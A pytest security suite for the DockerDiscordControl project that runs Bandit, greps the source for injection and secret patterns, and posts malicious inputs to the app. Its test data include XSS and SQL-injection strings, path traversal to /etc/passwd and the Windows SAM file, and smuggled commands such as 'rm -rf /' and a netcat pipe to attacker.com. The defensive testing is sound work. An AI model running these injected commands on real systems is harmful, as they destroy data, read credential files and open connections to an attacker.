# -*- coding: utf-8 -*-
# ============================================================================ #
# DockerDiscordControl (DDC) - Security SAST Tests                            #
# https://ddc.bot                                                              #
# Copyright (c) 2025 MAX                                                  #
# Licensed under the MIT License                                               #
# ============================================================================ #
"""
Static Application Security Testing (SAST) using Bandit and custom security checks.
Tests for security vulnerabilities in source code.
"""

import pytest
import os
import subprocess
import json
import tempfile
from pathlib import Path
from unittest.mock import patch, Mock

from tests.security.security_test_helpers import SecurityTestHelper


@pytest.mark.security
class TestSASTSecurityScanning:
    """Static Application Security Testing using Bandit."""
    
    @classmethod
    def setup_class(cls):
        """Setup security testing environment."""
        cls.project_root = Path(__file__).parent.parent.parent
        cls.helper = SecurityTestHelper()
    
    def test_bandit_security_scan(self):
        """Run Bandit security scan on the entire codebase."""
        # Run Bandit scan
        cmd = [
            'bandit',
            '-r', str(self.project_root),
            '-f', 'json',
            '-ll',  # Low confidence, low severity
            '--exclude', str(self.project_root / 'tests'),  # Exclude test files
            '--exclude', str(self.project_root / 'venv'),   # Exclude virtual env
            '--exclude', str(self.project_root / '.git'),   # Exclude git
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                # No issues found
                assert True
            elif result.returncode == 1:
                # Issues found, parse results
                try:
                    report = json.loads(result.stdout)
                    results = report.get('results', [])
                    
                    # Filter out acceptable issues (if any)
                    critical_issues = [
                        issue for issue in results
                        if issue.get('issue_severity') in ['HIGH', 'MEDIUM']
                        and not self._is_acceptable_issue(issue)
                    ]
                    
                    if critical_issues:
                        issues_summary = "\n".join([
                            f"- {issue['test_name']}: {issue['issue_text']} "
                            f"({issue['filename']}:{issue['line_number']})"
                            for issue in critical_issues
                        ])
                        pytest.fail(f"Security issues found:\n{issues_summary}")
                    
                except json.JSONDecodeError:
                    pytest.fail(f"Bandit scan failed: {result.stderr}")
            else:
                # Bandit error
                pytest.fail(f"Bandit scan error: {result.stderr}")
                
        except subprocess.TimeoutExpired:
            pytest.fail("Bandit scan timed out")
        except FileNotFoundError:
            pytest.skip("Bandit not installed - run: pip install bandit")
    
    def _is_acceptable_issue(self, issue):
        """Check if a security issue is acceptable/false positive."""
        test_name = issue.get('test_name', '')
        filename = issue.get('filename', '')
        
        # Known acceptable issues (customize based on your codebase)
        acceptable_patterns = [
            # Example: Flask debug mode in development
            ('B201', 'config'),  # Flask debug mode
            # Example: Hardcoded passwords in test files
            ('B106', 'test_'),   # Hardcoded password in tests
        ]
        
        for test_id, file_pattern in acceptable_patterns:
            if test_id in test_name and file_pattern in filename:
                return True
        
        return False
    
    def test_no_hardcoded_secrets(self):
        """Test that no hardcoded secrets are present in code."""
        secret_patterns = [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'api_key\s*=\s*["\'][^"\']+["\']',
            r'secret\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\'][^"\']+["\']',
            r'["\'][A-Za-z0-9]{32,}["\']',  # Long strings that might be keys
        ]
        
        findings = self.helper.scan_for_patterns(
            self.project_root,
            secret_patterns,
            exclude_dirs=['tests', 'venv', '.git', '__pycache__']
        )
        
        # Filter out acceptable patterns
        critical_findings = []
        for finding in findings:
            if not self._is_acceptable_secret(finding):
                critical_findings.append(finding)
        
        if critical_findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in critical_findings
            ])
            pytest.fail(f"Potential hardcoded secrets found:\n{findings_summary}")
    
    def _is_acceptable_secret(self, finding):
        """Check if a potential secret finding is acceptable."""
        file_path = finding['file']
        match_text = finding['match'].lower()
        
        # Acceptable patterns
        if any(pattern in file_path for pattern in ['test_', 'example', 'template']):
            return True
        
        if any(pattern in match_text for pattern in ['test', 'example', 'placeholder']):
            return True
        
        return False
    
    def test_sql_injection_patterns(self):
        """Test for SQL injection vulnerability patterns."""
        sql_injection_patterns = [
            r'cursor\.execute\([^)]*%[^)]*\)',  # String formatting in SQL
            r'\.execute\([^)]*\+[^)]*\)',      # String concatenation in SQL
            r'SELECT\s+.*\s+.*%.*FROM',        # Direct formatting in SELECT
        ]
        
        findings = self.helper.scan_for_patterns(
            self.project_root,
            sql_injection_patterns,
            file_extensions=['.py'],
            exclude_dirs=['tests', 'venv', '.git']
        )
        
        if findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in findings
            ])
            pytest.fail(f"Potential SQL injection vulnerabilities:\n{findings_summary}")
    
    def test_command_injection_patterns(self):
        """Test for command injection vulnerability patterns."""
        command_injection_patterns = [
            r'subprocess\.[^(]*\([^)]*\+[^)]*\)',     # String concat in subprocess
            r'os\.system\([^)]*\+[^)]*\)',            # String concat in os.system
            r'subprocess\.[^(]*\([^)]*%[^)]*\)',      # String format in subprocess
            r'shell=True.*\+',                        # Shell=True with concatenation
        ]
        
        findings = self.helper.scan_for_patterns(
            self.project_root,
            command_injection_patterns,
            file_extensions=['.py'],
            exclude_dirs=['tests', 'venv', '.git']
        )
        
        # Filter acceptable cases
        critical_findings = []
        for finding in findings:
            # Allow some patterns in specific contexts
            if not self._is_acceptable_command_pattern(finding):
                critical_findings.append(finding)
        
        if critical_findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in critical_findings
            ])
            pytest.fail(f"Potential command injection vulnerabilities:\n{findings_summary}")
    
    def _is_acceptable_command_pattern(self, finding):
        """Check if command pattern is acceptable."""
        match_text = finding['match']
        
        # Allow specific safe patterns
        safe_patterns = [
            'shell=False',  # Explicitly safe
            'args=',        # Using args parameter
        ]
        
        return any(pattern in match_text for pattern in safe_patterns)
    
    def test_xss_vulnerability_patterns(self):
        """Test for Cross-Site Scripting (XSS) vulnerability patterns."""
        xss_patterns = [
            r'render_template_string\([^)]*\+[^)]*\)',  # Template string injection
            r'Markup\([^)]*\+[^)]*\)',                  # Flask Markup with concat
            r'safe.*\+',                                # Jinja2 safe filter with concat
            r'\|safe.*\+',                              # Jinja2 safe with concatenation
        ]
        
        findings = self.helper.scan_for_patterns(
            self.project_root,
            xss_patterns,
            file_extensions=['.py', '.html', '.jinja2'],
            exclude_dirs=['tests', 'venv', '.git']
        )
        
        if findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in findings
            ])
            pytest.fail(f"Potential XSS vulnerabilities:\n{findings_summary}")
    
    def test_insecure_random_usage(self):
        """Test for insecure random number generation."""
        insecure_random_patterns = [
            r'import random(?!\w)',
            r'random\.random\(',
            r'random\.randint\(',
            r'random\.choice\(',
        ]
        
        findings = self.helper.scan_for_patterns(
            self.project_root,
            insecure_random_patterns,
            file_extensions=['.py'],
            exclude_dirs=['tests', 'venv', '.git']
        )
        
        # Filter out acceptable uses (non-cryptographic)
        critical_findings = []
        for finding in findings:
            if self._is_cryptographic_context(finding):
                critical_findings.append(finding)
        
        if critical_findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in critical_findings
            ])
            pytest.fail(f"Insecure random usage in cryptographic context:\n{findings_summary}")
    
    def _is_cryptographic_context(self, finding):
        """Check if random usage is in cryptographic context."""
        file_content = Path(finding['file']).read_text()
        context_keywords = ['password', 'token', 'key', 'secret', 'salt', 'nonce']
        
        # Simple heuristic: check surrounding lines
        lines = file_content.split('\n')
        line_num = finding['line'] - 1
        
        context_lines = lines[max(0, line_num-3):min(len(lines), line_num+4)]
        context_text = ' '.join(context_lines).lower()
        
        return any(keyword in context_text for keyword in context_keywords)
    
    def test_unsafe_deserialization(self):
        """Test for unsafe deserialization patterns."""
        unsafe_patterns = [
            r'pickle\.loads?\([^)]*\)',
            r'cPickle\.loads?\([^)]*\)',
            r'yaml\.load\([^)]*\)',  # Without safe_load
            r'eval\([^)]*\)',
            r'exec\([^)]*\)',
        ]
        
        findings = self.helper.scan_for_patterns(
            self.project_root,
            unsafe_patterns,
            file_extensions=['.py'],
            exclude_dirs=['tests', 'venv', '.git']
        )
        
        # Filter acceptable cases
        critical_findings = []
        for finding in findings:
            if not self._is_acceptable_deserialization(finding):
                critical_findings.append(finding)
        
        if critical_findings:
            findings_summary = "\n".join([
                f"- {finding['file']}:{finding['line']}: {finding['match']}"
                for finding in critical_findings
            ])
            pytest.fail(f"Unsafe deserialization patterns:\n{findings_summary}")
    
    def _is_acceptable_deserialization(self, finding):
        """Check if deserialization pattern is acceptable."""
        match_text = finding['match']
        
        # yaml.safe_load is acceptable
        if 'yaml.safe_load' in match_text:
            return True
        
        # eval/exec might be acceptable in very specific contexts
        if 'eval(' in match_text or 'exec(' in match_text:
            file_content = Path(finding['file']).read_text()
            # Check if it's in a controlled context (very basic check)
            if 'trusted_input' in file_content or 'validated_code' in file_content:
                return True
        
        return False


@pytest.mark.security
class TestInputValidationSecurity:
    """Test input validation and sanitization."""
    
    def setup_method(self):
        """Setup for each test."""
        self.helper = SecurityTestHelper()
    
    def test_web_form_validation(self):
        """Test that web forms have proper validation."""
        from app.web_ui import create_app
        
        app = create_app()
        client = app.test_client()
        
        # Test login form with malicious input
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "javascript:alert('xss')",
        ]
        
        for malicious_input in malicious_inputs:
            response = client.post('/login', data={
                'username': malicious_input,
                'password': 'test'
            })
            
            # Should not execute the malicious input
            assert malicious_input not in response.get_data(as_text=True)
            assert response.status_code in [200, 302, 400, 401]  # Valid HTTP responses
    
    def test_api_endpoint_validation(self):
        """Test API endpoints handle malicious input safely."""
        from app.web_ui import create_app
        
        app = create_app()
        client = app.test_client()
        
        # Test container control endpoints
        malicious_payloads = [
            {'action': '<script>alert("xss")</script>'},
            {'container_name': '"; rm -rf /; echo "'},
            {'container_name': '../../../etc/passwd'},
        ]
        
        for payload in malicious_payloads:
            response = client.post('/api/container/control', 
                                 json=payload,
                                 headers={'Content-Type': 'application/json'})
            
            # Should handle malicious input gracefully
            assert response.status_code in [400, 401, 403, 404, 422]
            response_text = response.get_data(as_text=True)
            
            # Should not reflect malicious input
            for value in payload.values():
                if isinstance(value, str) and '<script>' in value:
                    assert '<script>' not in response_text
    
    @pytest.mark.parametrize("payload", [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
        "file:///etc/passwd",
    ])
    def test_path_traversal_protection(self, payload):
        """Test protection against path traversal attacks."""
        from app.web_ui import create_app
        
        app = create_app()
        client = app.test_client()
        
        # Test various endpoints that might handle file paths
        endpoints = [
            f'/static/{payload}',
            f'/logs?file={payload}',
            f'/download?path={payload}',
        ]
        
        for endpoint in endpoints:
            response = client.get(endpoint)
            
            # Should not serve sensitive files
            response_text = response.get_data(as_text=True).lower()
            
            # Check that we don't get sensitive file contents
            sensitive_patterns = [
                'root:x:',  # /etc/passwd
                'administrator:',  # Windows users
                'password',
                'secret',
            ]
            
            for pattern in sensitive_patterns:
                assert pattern not in response_text
    
    def test_command_injection_protection(self):
        """Test protection against command injection."""
        # This would test any functions that execute system commands
        from services.docker.docker_service import DockerService
        
        service = DockerService()
        
        # Test with malicious container names
        malicious_names = [
            "container; rm -rf /",
            "container && cat /etc/passwd",
            "container | nc attacker.com 4444",
            "container`cat /etc/passwd`",
        ]
        
        for malicious_name in malicious_names:
            # These should fail gracefully, not execute commands
            result = service.get_container_by_name(malicious_name)
            assert result.success is False
            # Should not contain sensitive data that would indicate command execution
            assert 'root:' not in str(result.error)


@pytest.mark.security
class TestCryptographicSecurity:
    """Test cryptographic implementations."""
    
    def test_token_encryption_strength(self):
        """Test that token encryption uses strong algorithms."""
        from utils.token_security import TokenSecurityManager
        
        manager = TokenSecurityManager()
        
        # Test data
        test_token = "test_token_12345678901234567890"
        test_password = "test_password_123"
        
        # Encrypt token
        encrypted = manager.encrypt_token(test_token, test_password)
        
        # Should be properly encrypted (not plaintext)
        assert encrypted != test_token
        assert len(encrypted) > len(test_token)
        
        # Should use proper encryption (base64 encoded result)
        import base64
        try:
            decoded = base64.b64decode(encrypted)
            assert len(decoded) > 0
        except:
            pytest.fail("Encrypted token is not properly base64 encoded")
        
        # Decrypt should work
        decrypted = manager.decrypt_token(encrypted, test_password)
        assert decrypted == test_token
        
        # Wrong password should fail
        wrong_decrypted = manager.decrypt_token(encrypted, "wrong_password")
        assert wrong_decrypted != test_token
    
    def test_password_hashing(self):
        """Test that passwords are properly hashed."""
        from app.auth import hash_password, verify_password
        
        test_password = "test_password_123"
        
        # Hash password
        hashed = hash_password(test_password)
        
        # Should not be plaintext
        assert hashed != test_password
        
        # Should use proper hashing (bcrypt produces specific format)
        assert hashed.startswith('$2b$') or hashed.startswith('$2a$')
        
        # Verification should work
        assert verify_password(test_password, hashed) is True
        assert verify_password("wrong_password", hashed) is False
    
    def test_secure_session_configuration(self):
        """Test that Flask sessions are securely configured."""
        from app.web_ui import create_app
        
        app = create_app()
        
        # Check security configurations
        assert app.config.get('SECRET_KEY') is not None
        assert len(app.config.get('SECRET_KEY', '')) > 16  # Minimum key length
        
        # Session should be configured securely
        with app.test_request_context():
            from flask import session
            # Session should have secure attributes
            # This is a basic check - full security would require examining middleware


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "security"])